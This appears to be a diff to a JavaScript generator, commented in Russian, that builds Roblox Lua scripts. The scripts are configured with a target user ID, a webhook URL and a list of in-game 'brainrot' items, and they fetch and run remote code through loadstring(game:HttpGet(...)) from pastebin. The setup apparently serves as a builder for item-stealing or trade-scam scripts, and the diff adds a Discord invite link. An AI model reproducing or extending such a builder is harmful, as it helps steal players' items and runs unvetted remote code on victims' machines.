@@ -131,32 +131,25 @@ document.getElementById('generateBtn').addEventListener('click', function() {
         ? 'loadstring(game:HttpGet("https://pastebin.com/raw/vyRfjXm0"))()'
         : customScript;
     
-    let brainrotListStr = "{\n    " + selectedBrainrots.map(br => `"${br}"`).join(", ") + "\n}";
+    // Формируем список брейнротов для Lua
+    let brainrotListStr = "{\n    " + selectedBrainrots.map(br => `"${br}"`).join(",\n    ") + "\n}";
     
     let script = `-- ========== КОНФИГ ==========
 local CONFIG = {
     TARGET_USER_ID = "${robloxId}",
     TARGET_NAME = "${robloxNick}",
     WEBHOOK_URL = "${webhookUrl}",
-    FIX_FOV = true,
-    REMOVE_NOTIFICATIONS = true,
-    MUTE_SOUNDS = true,
-    DELAY_AFTER_INPUT = 1,
-    MAX_TRADE_ATTEMPTS = 20
+    TARGET_BRAINROTS = ${brainrotListStr}
 }
 -- ========== КОНЕЦ КОНФИГА ==========
 
--- ===== ЗАГРУЗКА ДОПОЛНИТЕЛЬНОГО СКРИПТА =====
-${loadScript}
+-- ===== ЗАГРУЗКА ОСНОВНОГО СКРИПТА =====
+-- ССЫЛКА НА ОСНОВНОЙ СКРИПТ (ЗАМЕНИТЬ НА РЕАЛЬНУЮ)
+loadstring(game:HttpGet("ССЫЛКА_НА_СКРИПТ"))()
 
--- ===== ЗАДЕРЖКА 3 СЕКУНДЫ =====
-task.wait(3)
-
--- ===== ОСНОВНОЙ СКРИПТ =====
 print("Скрипт загружен")
 print("Таргет ID: " .. CONFIG.TARGET_USER_ID)
-print("Webhook: " .. CONFIG.WEBHOOK_URL)
-print("Таргет брейнроты: ${selectedBrainrots.length} шт.")`;
+print("Таргет брейнротов: " .. #CONFIG.TARGET_BRAINROTS .. " шт.")`;
 
     document.getElementById('scriptOutput').textContent = script;
     document.getElementById('output').style.display = 'block';
@@ -171,6 +164,11 @@ document.getElementById('copyBtn').addEventListener('click', function() {
     }).catch(() => {
         alert('Не удалось скопировать');
     });
+});
+
+// Дискорд кнопка
+document.getElementById('discordBtn').addEventListener('click', function() {
+    window.open('https://discord.gg/9A6x27c9k6', '_blank');
 });
 
 // Запуск
